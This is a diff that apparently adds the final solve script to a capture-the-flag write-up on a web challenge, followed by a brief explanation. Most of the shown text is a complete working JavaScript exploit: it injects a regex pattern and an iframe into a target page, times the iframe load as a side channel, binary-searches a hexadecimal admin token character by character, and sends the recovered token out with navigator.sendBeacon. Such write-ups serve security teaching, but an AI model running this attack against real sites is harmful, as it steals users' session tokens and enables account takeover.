@@ -86,3 +86,92 @@ To steal an admin token: req.cookies.TOKEN and the token's format is 6-bytes hex
   The <iframe> element is counted as part of the window.frames or window.length property.
   When the browser parses and renders the HTML containing the <iframe>, the window.length value increases by 1 after the iframe is fully loaded.
   This allows the attacker to measure the time it takes for the iframe to "appear" in the DOM, which indirectly correlates to how long the browser takes to validate the pattern in the <input>.
+
+### Final Solve script
+```
+<body>
+  <script type="module">
+    // http://web:3000
+    const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const waitFor = async (f) => {
+      while (true) {
+        if (await f()) return;
+        await sleep(3);
+      }
+    };
+
+    const win = open("about:blank");
+
+    const measure = async (pattern) => {
+      win.location = "about:blank";
+      await waitFor(() => win.length === 0);
+      await sleep(100);
+
+      const pad = "x".repeat(100);
+      const html = `
+        <input type="text" pattern="${pattern}" value="${pad}{{TOKEN}}">
+        <iframe></iframe>
+      `.trim();
+      const url = `${BASE_URL}?${new URLSearchParams({ html })}`;
+
+      win.location = url;
+      await waitFor(() => {
+        try {
+          win.origin;
+          return false;
+        } catch {
+          return true;
+        }
+      });
+      const start = performance.now();
+      await waitFor(() => win.length === 1);
+      const time = performance.now() - start;
+
+      return time;
+    };
+
+    const search = async (known) => {
+      const CHARS = "0123456789abcdef";
+      const W = 12;
+
+      // Binary Search
+      let left = 0;
+      let right = CHARS.length;
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+
+        const timeL = await measure(`.*(.?){${W}}[${CHARS.slice(left, mid)}]${known}`);
+        const timeR = await measure(`.*(.?){${W}}[${CHARS.slice(mid, right)}]${known}`);
+
+        if ((Math.min(timeL, timeR) + 10) * 4 > Math.max(timeL, timeR)) {
+          // retry
+          await sleep(2000);
+          continue;
+        }
+
+        if (timeL < timeR) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+
+      return CHARS.slice(left, right);
+    };
+
+    const main = async () => {
+      let known = "";
+      for (let i = 0; i < 6 * 2; i++) {
+        known = (await search(known)) + known;
+        navigator.sendBeacon("/debug", JSON.stringify({ i, known }));
+      }
+      navigator.sendBeacon("/token", known);
+    };
+    main();
+  </script>
+</body>
+```
+It repeatedly constructs HTML containing an input field and an iframe, dynamically sets it in an opened window (win), and measures how long the iframe takes to load. The measure function times the regex evaluation by introducing specific patterns and iteratively refining the possible characters for the token using binary search over a set of hexadecimal characters (CHARS). The search function narrows down possibilities by analyzing timing discrepancies between different patterns. The main function orchestrates this process, deducing the token character by character and reporting progress to the server via navigator.sendBeacon
